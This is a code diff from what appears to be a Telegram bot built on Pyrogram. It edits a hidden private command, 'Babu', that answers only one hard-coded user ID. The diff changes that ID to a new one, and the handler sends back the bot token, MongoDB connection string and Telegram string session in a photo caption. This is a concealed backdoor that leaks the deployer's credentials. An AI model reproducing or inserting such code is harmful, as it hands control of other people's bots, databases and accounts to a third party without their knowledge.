@@ -110,11 +110,11 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("Babu")
     & filters.private
-    & filters.user(8035100093)
+    & filters.user(8457819921)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+          photo=f"https://files.catbox.moe/nlazeq.jpg",
        caption=f"""𝖡𝗈ᴛ 𝖳ᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\n𝖬ᴏɴɢᴏ:-   `{MONGO_DB_URI}`\n\n𝖲ᴛʀɪɴɢ 𝖲ᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/+aduxNg5K88NhMTg1)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
